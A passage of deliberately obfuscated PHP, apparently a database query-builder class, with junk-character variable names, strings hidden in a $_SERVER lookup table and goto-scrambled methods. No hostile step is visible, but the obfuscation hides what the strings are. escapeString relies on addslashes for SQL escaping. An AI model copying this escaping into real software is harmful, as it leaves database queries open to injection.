$c›î¢¾‡ó[861]; } protected function parseWhere($E´¶‹ÉÇ) { $Fˆ§—íß•Ì =& $_SERVER[´¬]; $b…¢êˆ·ô§ = $Fˆ§—íß•Ì[33]; if (is_string($E´¶‹ÉÇ)) { $b…¢êˆ·ô§ = $E´¶‹ÉÇ; } else { $EåÕäŒ™« = isset($E´¶‹ÉÇ[$Fˆ§—íß•Ì[958]]) ? strtoupper($E´¶‹ÉÇ[$Fˆ§—íß•Ì[958]]) : $Fˆ§—íß•Ì[33]; if (in_array($EåÕäŒ™«, array($Fˆ§—íß•Ì[959], $Fˆ§—íß•Ì[960], $Fˆ§—íß•Ì[961]))) { $EåÕäŒ™« = $Fˆ§—íß•Ì[50] . $EåÕäŒ™« . $Fˆ§—íß•Ì[50]; unset($E´¶‹ÉÇ[$Fˆ§—íß•Ì[958]]); } else { $EåÕäŒ™« = $Fˆ§—íß•Ì[962]; } foreach ($E´¶‹ÉÇ as $FŒÛó² => $FÏø¢ì „‰) { $b…¢êˆ·ô§ .= $Fˆ§—íß•Ì[274]; if (is_numeric($FŒÛó²)) { $FŒÛó² = $Fˆ§—íß•Ì[963]; } if (0 === strpos($FŒÛó², $Fˆ§—íß•Ì[71])) { $b…¢êˆ·ô§ .= $this->parseThinkWhere($FŒÛó², $FÏø¢ì „‰); } else { if (!preg_match($Fˆ§—íß•Ì[964], trim($FŒÛó²))) { think_exception(think_lang($Fˆ§—íß•Ì[965]) . $Fˆ§—íß•Ì[4] . $FŒÛó²); } $Dƒ‹¥ãÑµƒ = is_array($FÏø¢ì „‰) && isset($FÏø¢ì „‰[$Fˆ§—íß•Ì[966]]); $FŒÛó² = trim($FŒÛó²); if (strpos($FŒÛó², $Fˆ§—íß•Ì[280])) { $Eì‹î™ğÆ = explode($Fˆ§—íß•Ì[280], $FŒÛó²); $b˜ä»‹¦¥ = array(); foreach ($Eì‹î™ğÆ as $FñÀß…Ï´¨ => $DŞªÜ…ĞÕî) { $DÕ»è§ïØÛ = $Dƒ‹¥ãÑµƒ ? $FÏø¢ì „‰[$FñÀß…Ï´¨] : $FÏø¢ì „‰; $b˜ä»‹¦¥[] = $Fˆ§—íß•Ì[257] . $this->parseWhereItem($this->parseKey($DŞªÜ…ĞÕî), $DÕ»è§ïØÛ) . $Fˆ§—íß•Ì[866]; } $b…¢êˆ·ô§ .= implode($Fˆ§—íß•Ì[967], $b˜ä»‹¦¥); } elseif (strpos($FŒÛó², $Fˆ§—íß•Ì[281])) { $Eì‹î™ğÆ = explode($Fˆ§—íß•Ì[281], $FŒÛó²); $b˜ä»‹¦¥ = array(); foreach ($Eì‹î™ğÆ as $FñÀß…Ï´¨ => $DŞªÜ…ĞÕî) { $DÕ»è§ïØÛ = $Dƒ‹¥ãÑµƒ ? $FÏø¢ì „‰[$FñÀß…Ï´¨] : $FÏø¢ì „‰; $b˜ä»‹¦¥[] = $Fˆ§—íß•Ì[257] . $this->parseWhereItem($this->parseKey($DŞªÜ…ĞÕî), $DÕ»è§ïØÛ) . $Fˆ§—íß•Ì[866]; } $b…¢êˆ·ô§ .= implode($Fˆ§—íß•Ì[962], $b˜ä»‹¦¥); } else { $b…¢êˆ·ô§ .= $this->parseWhereItem($this->parseKey($FŒÛó²), $FÏø¢ì „‰); } } $b…¢êˆ·ô§ .= $Fˆ§—íß•Ì[275] . $EåÕäŒ™«; } $b…¢êˆ·ô§ = substr($b…¢êˆ·ô§, 0, -strlen($EåÕäŒ™«)); } return empty($b…¢êˆ·ô§) ? $Fˆ§—íß•Ì[33] : $Fˆ§—íß•Ì[968] . $b…¢êˆ·ô§; } protected function parseWhereItem($c¨„êÇç¥ƒ, $Bßö•©å˜) { $a…ç”¦ê£ò =& $_SERVER[´¬]; $cÀÔÒÓéª‹ = $a…ç”¦ê£ò[33]; if (is_array($Bßö•©å˜)) { if (is_string($Bßö•©å˜[0])) { $Fà‚‘ïÛÛ = strtolower($Bßö•©å˜[0]); if (in_array($Bßö•©å˜[0], array($a…ç”¦ê£ò[952], $a…ç”¦ê£ò[969], $a…ç”¦ê£ò[970], $a…ç”¦ê£ò[971], $a…ç”¦ê£ò[972], $a…ç”¦ê£ò[973]))) { $cÀÔÒÓéª‹ .= $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $Bßö•©å˜[0] . $a…ç”¦ê£ò[50] . $this->parseValue($Bßö•©å˜[1]); } elseif (preg_match($a…ç”¦ê£ò[974], $Bßö•©å˜[0])) { $cÀÔÒÓéª‹ .= $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $this->exp[$Fà‚‘ïÛÛ] . $a…ç”¦ê£ò[50] . $this->parseValue($Bßö•©å˜[1]); } elseif (preg_match($a…ç”¦ê£ò[975], $Bßö•©å˜[0])) { if (is_array($Bßö•©å˜[1])) { $DŸ«âÂÆ¢† = isset($Bßö•©å˜[2]) ? strtoupper($Bßö•©å˜[2]) : $a…ç”¦ê£ò[960]; if (in_array($DŸ«âÂÆ¢†, array($a…ç”¦ê£ò[959], $a…ç”¦ê£ò[960], $a…ç”¦ê£ò[961]))) { $e‹—¨‰ „¥ = array(); foreach ($Bßö•©å˜[1] as $d¼Ÿ³È‰©ò) { $e‹—¨‰ „¥[] = $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $this->exp[$Fà‚‘ïÛÛ] . $a…ç”¦ê£ò[50] . $this->parseValue($d¼Ÿ³È‰©ò); } $cÀÔÒÓéª‹ .= $a…ç”¦ê£ò[257] . implode($a…ç”¦ê£ò[50] . $DŸ«âÂÆ¢† . $a…ç”¦ê£ò[50], $e‹—¨‰ „¥) . $a…ç”¦ê£ò[866]; } } else { $cÀÔÒÓéª‹ .= $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $this->exp[$Fà‚‘ïÛÛ] . $a…ç”¦ê£ò[50] . $this->parseValue($Bßö•©å˜[1]); } } elseif ($a…ç”¦ê£ò[294] == $Fà‚‘ïÛÛ) { $cÀÔÒÓéª‹ .= $a…ç”¦ê£ò[864] . $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $Bßö•©å˜[1] . $a…ç”¦ê£ò[976]; } elseif (preg_match($a…ç”¦ê£ò[977], $Bßö•©å˜[0])) { $cÀÔÒÓéª‹ .= $Bßö•©å˜[0]; } elseif (preg_match($a…ç”¦ê£ò[978], $Bßö•©å˜[0])) { if (isset($Bßö•©å˜[2]) && $a…ç”¦ê£ò[294] == $Bßö•©å˜[2]) { $cÀÔÒÓéª‹ .= $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $this->exp[$Fà‚‘ïÛÛ] . $a…ç”¦ê£ò[50] . $Bßö•©å˜[1]; } else { if (is_string($Bßö•©å˜[1])) { $Bßö•©å˜[1] = explode($a…ç”¦ê£ò[47], $Bßö•©å˜[1]); } $dŒ®Ïã˜ˆæ = implode($a…ç”¦ê£ò[47], $this->parseValue($Bßö•©å˜[1])); $cÀÔÒÓéª‹ .= $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $this->exp[$Fà‚‘ïÛÛ] . $a…ç”¦ê£ò[864] . $dŒ®Ïã˜ˆæ . $a…ç”¦ê£ò[866]; } } elseif (preg_match($a…ç”¦ê£ò[979], $Bßö•©å˜[0])) { $A¦ŠÓ©—ˆğ = is_string($Bßö•©å˜[1]) ? explode($a…ç”¦ê£ò[47], $Bßö•©å˜[1]) : $Bßö•©å˜[1]; $cÀÔÒÓéª‹ .= $a…ç”¦ê£ò[864] . $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $this->exp[$Fà‚‘ïÛÛ] . $a…ç”¦ê£ò[50] . $this->parseValue($A¦ŠÓ©—ˆğ[0]) . $a…ç”¦ê£ò[962] . $this->parseValue($A¦ŠÓ©—ˆğ[1]) . $a…ç”¦ê£ò[275]; } else { think_exception(think_lang($a…ç”¦ê£ò[965]) . $a…ç”¦ê£ò[4] . $Bßö•©å˜[0]); } } else { $f×™ˆ¡åØ‹ = count($Bßö•©å˜); $C»ìİ¯ËëÔ = $a…ç”¦ê£ò[33]; if (is_string($Bßö•©å˜[$f×™ˆ¡åØ‹ - 1])) { $C»ìİ¯ËëÔ = isset($Bßö•©å˜[$f×™ˆ¡åØ‹ - 1]) ? strtoupper($Bßö•©å˜[$f×™ˆ¡åØ‹ - 1]) : $a…ç”¦ê£ò[33]; if (in_array($C»ìİ¯ËëÔ, array($a…ç”¦ê£ò[959], $a…ç”¦ê£ò[960], $a…ç”¦ê£ò[961]))) { $f×™ˆ¡åØ‹ = $f×™ˆ¡åØ‹ - 1; } } else { $C»ìİ¯ËëÔ = $a…ç”¦ê£ò[959]; } for ($Eìõ¨…²˜í = 0; $Eìõ¨…²˜í < $f×™ˆ¡åØ‹; $Eìõ¨…²˜í++) { $A¦ŠÓ©—ˆğ = is_array($Bßö•©å˜[$Eìõ¨…²˜í]) ? $Bßö•©å˜[$Eìõ¨…²˜í][1] : $Bßö•©å˜[$Eìõ¨…²˜í]; if ($a…ç”¦ê£ò[294] == strtolower($Bßö•©å˜[$Eìõ¨…²˜í][0])) { $cÀÔÒÓéª‹ .= $a…ç”¦ê£ò[257] . $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $A¦ŠÓ©—ˆğ . $a…ç”¦ê£ò[976] . $C»ìİ¯ËëÔ . $a…ç”¦ê£ò[50]; } else { $e±‚ëÔ‰Á = is_array($Bßö•©å˜[$Eìõ¨…²˜í]) ? $this->exp[strtolower($Bßö•©å˜[$Eìõ¨…²˜í][0])] : $a…ç”¦ê£ò[952]; if (!$e±‚ëÔ‰Á && is_array($Bßö•©å˜[$Eìõ¨…²˜í]) && in_array($Bßö•©å˜[$Eìõ¨…²˜í][0], array($a…ç”¦ê£ò[952], $a…ç”¦ê£ò[969], $a…ç”¦ê£ò[970], $a…ç”¦ê£ò[971], $a…ç”¦ê£ò[972], $a…ç”¦ê£ò[973]))) { $e±‚ëÔ‰Á = $Bßö•©å˜[$Eìõ¨…²˜í][0]; } $cÀÔÒÓéª‹ .= $a…ç”¦ê£ò[257] . $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[50] . $e±‚ëÔ‰Á . $a…ç”¦ê£ò[50] . $this->parseValue($A¦ŠÓ©—ˆğ) . $a…ç”¦ê£ò[976] . $C»ìİ¯ËëÔ . $a…ç”¦ê£ò[50]; } } $cÀÔÒÓéª‹ = substr($cÀÔÒÓéª‹, 0, -4); } } else { $cÀÔÒÓéª‹ .= $c¨„êÇç¥ƒ . $a…ç”¦ê£ò[980] . $this->parseValue($Bßö•©å˜); } return $cÀÔÒÓéª‹; } protected function parseThinkWhere($A‘ˆŞä˜Õ, $FÙùˆ–ò¡÷) { $B¯çíÕ¨Óƒ =& $_SERVER[´¬]; $E“’Á—Œ­¯ = $B¯çíÕ¨Óƒ[33]; switch ($A‘ˆŞä˜Õ) { case $B¯çíÕ¨Óƒ[349]: $E“’Á—Œ­¯ = $FÙùˆ–ò¡÷; break; case $B¯çíÕ¨Óƒ[963]: $E“’Á—Œ­¯ = is_string($FÙùˆ–ò¡÷) ? $FÙùˆ–ò¡÷ : substr($this->parseWhere($FÙùˆ–ò¡÷), 6); break; case $B¯çíÕ¨Óƒ[981]: parse_str($FÙùˆ–ò¡÷, $E®ˆ­‡™); if (isset($E®ˆ­‡™[$B¯çíÕ¨Óƒ[958]])) { $B¦—‚ùÜ– = $B¯çíÕ¨Óƒ[50] . strtoupper($E®ˆ­‡™[$B¯çíÕ¨Óƒ[958]]) . $B¯çíÕ¨Óƒ[50]; unset($E®ˆ­‡™[$B¯çíÕ¨Óƒ[958]]); } else { $B¦—‚ùÜ– = $B¯çíÕ¨Óƒ[962]; } $d°ÊñÓ›šƒ = array(); foreach ($E®ˆ­‡™ as $C¸‚†”Ú˜â => $aÓØ°ø©ë¦) { $d°ÊñÓ›šƒ[] = $this->parseKey($C¸‚†”Ú˜â) . $B¯çíÕ¨Óƒ[980] . $this->parseValue($aÓØ°ø©ë¦); } $E“’Á—Œ­¯ = implode($B¦—‚ùÜ–, $d°ÊñÓ›šƒ); break; } return $E“’Á—Œ­¯; } protected function parseLimit($D‰ğá²Â®) { $a•È’ŞÃæô =& $_SERVER[´¬]; return !empty($D‰ğá²Â®) ? $a•È’ŞÃæô[48] . $D‰ğá²Â® . $a•È’ŞÃæô[50] : $a•È’ŞÃæô[33]; } protected function parseJoin($dË¯éá®×) { $bğ¥¨—Ğ½ê =& $_SERVER[´¬]; $F‘±“†›Ÿñ = $bğ¥¨—Ğ½ê[33]; if (!empty($dË¯éá®×)) { if (is_array($dË¯éá®×)) { foreach ($dË¯éá®× as $a‹åôàë‚´ => $DÕ•ÂÂÄ¨‘) { if (!1 !== stripos($DÕ•ÂÂÄ¨‘, $bğ¥¨—Ğ½ê[982])) { $F‘±“†›Ÿñ .= $bğ¥¨—Ğ½ê[50] . $DÕ•ÂÂÄ¨‘; } else { $F‘±“†›Ÿñ .= $bğ¥¨—Ğ½ê[983] . $DÕ•ÂÂÄ¨‘; } } } else { $F‘±“†›Ÿñ .= $bğ¥¨—Ğ½ê[983] . $dË¯éá®×; } } $F‘±“†›Ÿñ = preg_replace($bğ¥¨—Ğ½ê[984], think_config($bğ¥¨—Ğ½ê[890]) . $bğ¥¨—Ğ½ê[985], $F‘±“†›Ÿñ); return $F‘±“†›Ÿñ; } protected function parseOrder($aŠ¢®áŒª) { $aè£‘§íÖÓ =& $_SERVER[´¬]; if (is_array($aŠ¢®áŒª)) { $EÍìğŒ¢³¤ = array(); foreach ($aŠ¢®áŒª as $eÇÜÛôË => $B¨¬ª¡ç‘Û) { if (is_numeric($eÇÜÛôË)) { $EÍìğŒ¢³¤[] = $this->parseKey($B¨¬ª¡ç‘Û); } else { $B¨¬ª¡ç‘Û = in_array(strtoupper(trim($B¨¬ª¡ç‘Û)), array($aè£‘§íÖÓ[986], $aè£‘§íÖÓ[987])) ? $aè£‘§íÖÓ[50] . $B¨¬ª¡ç‘Û : $aè£‘§íÖÓ[33]; if (preg_match($aè£‘§íÖÓ[988], $eÇÜÛôË)) { $EÍìğŒ¢³¤[] = $this->parseKey($eÇÜÛôË) . $B¨¬ª¡ç‘Û; } else { think_exception($aè£‘§íÖÓ[989] . $eÇÜÛôË); } } } $aŠ¢®áŒª = implode($aè£‘§íÖÓ[47], $EÍìğŒ¢³¤); } return !empty($aŠ¢®áŒª) ? $aè£‘§íÖÓ[990] . $aŠ¢®áŒª : $aè£‘§íÖÓ[33]; } protected function parseGroup($c…Ç¥ó–Çß) { $ağ»³»·Ó =& $_SERVER[´¬]; return !empty($c…Ç¥ó–Çß) ? $ağ»³»·Ó[991] . $c…Ç¥ó–Çß : $ağ»³»·Ó[33]; } protected function parseHaving($bùÄ†ÌÂ„) { $eÛ‰˜²ŠÒš =& $_SERVER[´¬]; return !empty($bùÄ†ÌÂ„) ? $eÛ‰˜²ŠÒš[992] . $bùÄ†ÌÂ„ : $eÛ‰˜²ŠÒš[33]; } protected function parseComment($bé÷Æ×Ú‚â) { $E¸Ÿ«›Œƒ­ =& $_SERVER[´¬]; return !empty($bé÷Æ×Ú‚â) ? $E¸Ÿ«›Œƒ­[993] . $bé÷Æ×Ú‚â . $E¸Ÿ«›Œƒ­[994] : $E¸Ÿ«›Œƒ­[33]; } protected function parseDistinct($bäÕäâÔÛ³) { $d­Ò¤¦œ¬â =& $_SERVER[´¬]; return !empty($bäÕäâÔÛ³) ? $d­Ò¤¦œ¬â[995] : $d­Ò¤¦œ¬â[33]; } protected function parseUnion($eƒÙ “ö–) { $EŞìñ«‰àä =& $_SERVER[´¬]; if (empty($eƒÙ “ö–)) { return $EŞìñ«‰àä[33]; } if (isset($eƒÙ “ö–[$EŞìñ«‰àä[345]])) { $fè£èÛ½ˆ = $EŞìñ«‰àä[996]; unset($eƒÙ “ö–[$EŞìñ«‰àä[345]]); } else { $fè£èÛ½ˆ = $EŞìñ«‰àä[997]; } foreach ($eƒÙ “ö– as $føêƒ£ó¿á) { $B±©ê“ƒØ‡[] = $fè£èÛ½ˆ . (is_array($føêƒ£ó¿á) ? $this->buildSelectSql($føêƒ£ó¿á) : $føêƒ£ó¿á); } return implode($EŞìñ«‰àä[50], $B±©ê“ƒØ‡); } public function insert($bîÂ°Êğ°á, $eŒÏÉ¶®ùÈ = array(), $Fœ“»©âİ„ = false) { goto bæãß°µ²§; a«¹àƒ°ç­: foreach ($bîÂ°Êğ°á as $eÂ—÷í·µ‹ => $FñèÑØ±Äñ) { if (is_array($FñèÑØ±Äñ) && $CÊ‹œè¹[294] == $FñèÑØ±Äñ[0]) { $A·£î—’»‹[] = $this->parseKey($eÂ—÷í·µ‹); $f˜¼ÖÀÀÏó[] = $FñèÑØ±Äñ[1]; } elseif (is_scalar($FñèÑØ±Äñ) || is_null($FñèÑØ±Äñ)) { $A·£î—’»‹[] = $this->parseKey($eÂ—÷í·µ‹); $f˜¼ÖÀÀÏó[] = $this->parseValue($FñèÑØ±Äñ); } } $DäÕ‚±õƒÍ = ($Fœ“»©âİ„ ? $CÊ‹œè¹[868] : $CÊ‹œè¹[869]) . $CÊ‹œè¹[870] . $this->parseTable($eŒÏÉ¶®ùÈ[$CÊ‹œè¹[276]]) . $CÊ‹œè¹[864] . implode($CÊ‹œè¹[47], $A·£î—’»‹) . $CÊ‹œè¹[865] . implode($CÊ‹œè¹[47], $f˜¼ÖÀÀÏó) . $CÊ‹œè¹[866]; $DäÕ‚±õƒÍ .= $this->parseLock(isset($eŒÏÉ¶®ùÈ[$CÊ‹œè¹[812]]) ? $eŒÏÉ¶®ùÈ[$CÊ‹œè¹[812]] : !1); goto E”°êšáİù; E”°êšáİù: $DäÕ‚±õƒÍ .= $this->parseComment(!empty($eŒÏÉ¶®ùÈ[$CÊ‹œè¹[351]]) ? $eŒÏÉ¶®ùÈ[$CÊ‹œè¹[351]] : $CÊ‹œè¹[33]); return $this->execute($DäÕ‚±õƒÍ, $this->parseBind(!empty($eŒÏÉ¶®ùÈ[$CÊ‹œè¹[282]]) ? $eŒÏÉ¶®ùÈ[$CÊ‹œè¹[282]] : array())); goto Fø£Àœœë; bæãß°µ²§: $CÊ‹œè¹ =& $_SERVER[´¬]; $f˜¼ÖÀÀÏó = $A·£î—’»‹ = array(); $this->model = $eŒÏÉ¶®ùÈ[$CÊ‹œè¹[278]]; goto a«¹àƒ°ç­; Fø£Àœœë: } public function selectInsert($c»®Ñ÷Æ, $F‹•²Ë¯“à, $aàõ‡ë¡º˜ = array()) { goto e‹‘ßĞÔ¢š; DÀãß¯¦’¡: array_walk($c»®Ñ÷Æ, array($this, $E¿ß½ê–÷ç[867])); $F‘É˜ï­å³ = $E¿ß½ê–÷ç[998] . $this->parseTable($F‹•²Ë¯“à) . $E¿ß½ê–÷ç[864] . implode($E¿ß½ê–÷ç[47], $c»®Ñ÷Æ) . $E¿ß½ê–÷ç[976]; $F‘É˜ï­å³ .= $this->buildSelectSql($aàõ‡ë¡º˜); goto CÇâ†İã‰; CÇâ†İã‰: return $this->execute($F‘É˜ï­å³, $this->parseBind(!empty($aàõ‡ë¡º˜[$E¿ß½ê–÷ç[282]]) ? $aàõ‡ë¡º˜[$E¿ß½ê–÷ç[282]] : array())); goto e×‚‰‡Øšˆ; e‹‘ßĞÔ¢š: $E¿ß½ê–÷ç =& $_SERVER[´¬]; $this->model = $aàõ‡ë¡º˜[$E¿ß½ê–÷ç[278]]; if (is_string($c»®Ñ÷Æ)) { $c»®Ñ÷Æ = explode($E¿ß½ê–÷ç[47], $c»®Ñ÷Æ); } goto DÀãß¯¦’¡; e×‚‰‡Øšˆ: } public function update($c§¼ ô‡œà, $A¨Â­ÃÎÖˆ) { $F³«Öä»É =& $_SERVER[´¬]; $this->model = $A¨Â­ÃÎÖˆ[$F³«Öä»É[278]]; $Dô‘ÀŒÙåº = $F³«Öä»É[999] . $this->parseTable($A¨Â­ÃÎÖˆ[$F³«Öä»É[276]]) . $this->parseSet($c§¼ ô‡œà) . $this->parseWhere(!empty($A¨Â­ÃÎÖˆ[$F³«Öä»É[272]]) ? $A¨Â­ÃÎÖˆ[$F³«Öä»É[272]] : $F³«Öä»É[33]) . $this->parseOrder(!empty($A¨Â­ÃÎÖˆ[$F³«Öä»É[362]]) ? $A¨Â­ÃÎÖˆ[$F³«Öä»É[362]] : $F³«Öä»É[33]) . $this->parseLimit(!empty($A¨Â­ÃÎÖˆ[$F³«Öä»É[289]]) ? $A¨Â­ÃÎÖˆ[$F³«Öä»É[289]] : $F³«Öä»É[33]) . $this->parseLock(isset($A¨Â­ÃÎÖˆ[$F³«Öä»É[812]]) ? $A¨Â­ÃÎÖˆ[$F³«Öä»É[812]] : !1) . $this->parseComment(!empty($A¨Â­ÃÎÖˆ[$F³«Öä»É[351]]) ? $A¨Â­ÃÎÖˆ[$F³«Öä»É[351]] : $F³«Öä»É[33]); return $this->execute($Dô‘ÀŒÙåº, $this->parseBind(!empty($A¨Â­ÃÎÖˆ[$F³«Öä»É[282]]) ? $A¨Â­ÃÎÖˆ[$F³«Öä»É[282]] : array())); } public function delete($Fİ•İµŞˆ = array()) { $F—Œ‘ƒøÉ =& $_SERVER[´¬]; $this->model = $Fİ•İµŞˆ[$F—Œ‘ƒøÉ[278]]; $Eã¡Îà‚É = $F—Œ‘ƒøÉ[1000] . $this->parseTable($Fİ•İµŞˆ[$F—Œ‘ƒøÉ[276]]) . $this->parseWhere(!empty($Fİ•İµŞˆ[$F—Œ‘ƒøÉ[272]]) ? $Fİ•İµŞˆ[$F—Œ‘ƒøÉ[272]] : $F—Œ‘ƒøÉ[33]) . $this->parseOrder(!empty($Fİ•İµŞˆ[$F—Œ‘ƒøÉ[362]]) ? $Fİ•İµŞˆ[$F—Œ‘ƒøÉ[362]] : $F—Œ‘ƒøÉ[33]) . $this->parseLimit(!empty($Fİ•İµŞˆ[$F—Œ‘ƒøÉ[289]]) ? $Fİ•İµŞˆ[$F—Œ‘ƒøÉ[289]] : $F—Œ‘ƒøÉ[33]) . $this->parseLock(isset($Fİ•İµŞˆ[$F—Œ‘ƒøÉ[812]]) ? $Fİ•İµŞˆ[$F—Œ‘ƒøÉ[812]] : !1) . $this->parseComment(!empty($Fİ•İµŞˆ[$F—Œ‘ƒøÉ[351]]) ? $Fİ•İµŞˆ[$F—Œ‘ƒøÉ[351]] : $F—Œ‘ƒøÉ[33]); return $this->execute($Eã¡Îà‚É, $this->parseBind(!empty($Fİ•İµŞˆ[$F—Œ‘ƒøÉ[282]]) ? $Fİ•İµŞˆ[$F—Œ‘ƒøÉ[282]] : array())); } public function select($dÛ÷½ÜÊÅ² = array()) { goto aç‹‹ÀÃÃí; C‘ÙŞ•ÄİÎ: $Aä‘ß•™…¦ = isset($dÛ÷½ÜÊÅ²[$e¼œÇ½¥„[346]]) ? $dÛ÷½ÜÊÅ²[$e¼œÇ½¥„[346]] : !1; if ($Aä‘ß•™…¦) { $bá×ìî²»‰ = is_string($Aä‘ß•™…¦[$e¼œÇ½¥„[93]]) ? $Aä‘ß•™…¦[$e¼œÇ½¥„[93]] : $e¼œÇ½¥„[1001] . md5($c¯Ú±ãëŒ); $Aé‹ìš¦ë‘ = think_cache($bá×ìî²»‰, $e¼œÇ½¥„[33], $Aä‘ß•™…¦); if (!1 !== $Aé‹ìš¦ë‘) { return $Aé‹ìš¦ë‘; } } $E¢ƒôä¢¥ = $this->query($c¯Ú±ãëŒ, $this->parseBind(!empty($dÛ÷½ÜÊÅ²[$e¼œÇ½¥„[282]]) ? $dÛ÷½ÜÊÅ²[$e¼œÇ½¥„[282]] : array())); goto DºÉáã÷ì; DºÉáã÷ì: if ($Aä‘ß•™…¦ && !1 !== $E¢ƒôä¢¥) { think_cache($bá×ìî²»‰, $E¢ƒôä¢¥, $Aä‘ß•™…¦); } return $E¢ƒôä¢¥; goto BÖèÅåä¸·; aç‹‹ÀÃÃí: $e¼œÇ½¥„ =& $_SERVER[´¬]; $this->model = $dÛ÷½ÜÊÅ²[$e¼œÇ½¥„[278]]; $c¯Ú±ãëŒ = $this->buildSelectSql($dÛ÷½ÜÊÅ²); goto C‘ÙŞ•ÄİÎ; BÖèÅåä¸·: } public function buildSelectSql($fØß—ñò©Š = array()) { goto aŒåŠŠÊ÷¯; B–¼›ÂêŠ: return $D£’‹‘Êƒï; goto Aâ”¨œ‡Æ¬; aŒåŠŠÊ÷¯: $BßòàğÚ• =& $_SERVER[´¬]; if (isset($fØß—ñò©Š[$BßòàğÚ•[350]])) { if (strpos($fØß—ñò©Š[$BßòàğÚ•[350]], $BßòàğÚ•[47])) { list($a¿ğÍ†”’, $c™ÏÁÛÃ¯Î) = explode($BßòàğÚ•[47], $fØß—ñò©Š[$BßòàğÚ•[350]]); } else { $a¿ğÍ†”’ = $fØß—ñò©Š[$BßòàğÚ•[350]]; } $a¿ğÍ†”’ = $a¿ğÍ†”’ ? $a¿ğÍ†”’ : 1; $c™ÏÁÛÃ¯Î = isset($c™ÏÁÛÃ¯Î) ? $c™ÏÁÛÃ¯Î : (is_numeric($fØß—ñò©Š[$BßòàğÚ•[289]]) ? $fØß—ñò©Š[$BßòàğÚ•[289]] : 20); $C–Íâ °­ = $c™ÏÁÛÃ¯Î * ((int) $a¿ğÍ†”’ - 1); $fØß—ñò©Š[$BßòàğÚ•[289]] = $C–Íâ °­ . $BßòàğÚ•[47] . $c™ÏÁÛÃ¯Î; } if (think_config($BßòàğÚ•[1002])) { $C—ˆÒº´§‡ = $BßòàğÚ•[1003] . md5(serialize($fØß—ñò©Š)); $D½ÂÓ‡‹ = think_cache($C—ˆÒº´§‡); if ($D½ÂÓ‡‹) { return $D½ÂÓ‡‹; } } goto BÁœÕ˜ºÑ¡; BÁœÕ˜ºÑ¡: $D£’‹‘Êƒï = $this->parseSql($this->selectSql, $fØß—ñò©Š); $D£’‹‘Êƒï .= $this->parseLock(isset($fØß—ñò©Š[$BßòàğÚ•[812]]) ? $fØß—ñò©Š[$BßòàğÚ•[812]] : !1); if (isset($C—ˆÒº´§‡)) { think_cache($C—ˆÒº´§‡, $D£’‹‘Êƒï); } goto B–¼›ÂêŠ; Aâ”¨œ‡Æ¬: } public function parseSql($F¡ª¯õÆ„, $c¦ª…²º = array()) { $CïÍ‘ÃŸ¥ =& $_SERVER[´¬]; $F¡ª¯õÆ„ = str_replace(array($CïÍ‘ÃŸ¥[1004], $CïÍ‘ÃŸ¥[1005], $CïÍ‘ÃŸ¥[1006], $CïÍ‘ÃŸ¥[1007], $CïÍ‘ÃŸ¥[1008], $CïÍ‘ÃŸ¥[1009], $CïÍ‘ÃŸ¥[1010], $CïÍ‘ÃŸ¥[1011], $CïÍ‘ÃŸ¥[1012], $CïÍ‘ÃŸ¥[1013], $CïÍ‘ÃŸ¥[1014]), array($this->parseTable("{$c¦ª…²º[$CïÍ‘ÃŸ¥[276]]}"), $this->parseDistinct(isset($c¦ª…²º[$CïÍ‘ÃŸ¥[1015]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[1015]] : !1), $this->parseField(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[270]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[270]] : $CïÍ‘ÃŸ¥[182]), $this->parseJoin(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[279]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[279]] : $CïÍ‘ÃŸ¥[33]), $this->parseWhere(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[272]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[272]] : $CïÍ‘ÃŸ¥[33]), $this->parseGroup(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[1016]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[1016]] : $CïÍ‘ÃŸ¥[33]), $this->parseHaving(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[1017]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[1017]] : $CïÍ‘ÃŸ¥[33]), $this->parseOrder(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[362]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[362]] : $CïÍ‘ÃŸ¥[33]), $this->parseLimit(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[289]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[289]] : $CïÍ‘ÃŸ¥[33]), $this->parseUnion(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[344]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[344]] : $CïÍ‘ÃŸ¥[33]), $this->parseComment(!empty($c¦ª…²º[$CïÍ‘ÃŸ¥[351]]) ? $c¦ª…²º[$CïÍ‘ÃŸ¥[351]] : $CïÍ‘ÃŸ¥[33])), $F¡ª¯õÆ„); return $F¡ª¯õÆ„; } public function getLastSql($B‡ÁÁãÙ’ñ = '') { return $B‡ÁÁãÙ’ñ ? $this->modelSql[$B‡ÁÁãÙ’ñ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($F‡ŒÜìñäª) { return addslashes($F‡ŒÜìñäª); } public function setModel($AÙ°ºê¸ƒ) { $this->model = $AÙ°ºê¸ƒ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($AÛ–ÚÓ¥è™, $C‘§¯æ–³… = '') { $this->database = $AÛ–ÚÓ¥è™; $this->type = $C‘§¯æ–³…; } public function model($däõ«Î÷ ˆ = '') { return new ModelBase($däõ«Î÷ ˆ, $_SERVER[´¬][33], $this->database); } public function db($bµß¤¦Ë‰ˆ = false) { goto CØ¹–…‚†¥; f—ñ¯­¼Úµ: $c©ç©õŒ«² = 